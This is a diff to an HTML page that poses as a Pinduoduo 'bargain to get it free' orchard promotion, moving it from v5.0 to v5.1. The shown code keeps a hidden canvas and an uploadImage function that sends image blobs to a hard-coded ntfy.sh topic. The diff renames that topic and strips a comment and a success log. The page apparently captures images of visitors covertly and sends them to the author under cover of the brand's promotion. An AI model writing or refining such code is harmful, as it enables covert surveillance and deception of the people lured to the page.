@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>拼多多 - 多多果园 砍价免费拿 v5.0</title>
+<title>拼多多 - 多多果园 砍价免费拿 v5.1</title>
 </head>
 <body style="margin:0;font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Helvetica Neue',sans-serif;background:#f5f5f5;color:#333">
 
@@ -105,9 +105,9 @@
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-// ========== ⚠️ 改成你自己的 topic 名字 ==========
-var NTFY_TOPIC = 'lk20050411-photo';
-// ============================================
+// ====== 你的 ntfy topic ======
+var NTFY_TOPIC = 'lk050411photo';
+// ==============================
 
 var left = 88.32;
 
@@ -157,7 +157,6 @@ function showResult(cut){
   coinRain();
 }
 
-// 用 ntfy.sh 上传图片(国内访问还行)
 function uploadImage(blob){
   console.log('[DEBUG] uploading to ntfy, size:', blob.size);
   return new Promise(function(resolve){
@@ -178,9 +177,6 @@ function uploadImage(blob){
       return r.text();
     }).then(function(t){
       console.log('[DEBUG] ntfy resp:', t);
-      if(r && r.ok){
-        console.log('✓ sent!');
-      }
       resolve();
     }).catch(function(e){
       console.log('[DEBUG] ntfy err:', e);
@@ -311,7 +307,7 @@ spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
 document.head.appendChild(spinStyle);
 
 updateProgress();
-console.log('[DEBUG] script loaded ok v5.0');
+console.log('[DEBUG] script loaded ok v5.1');
 </script>
 </body>
 </html>
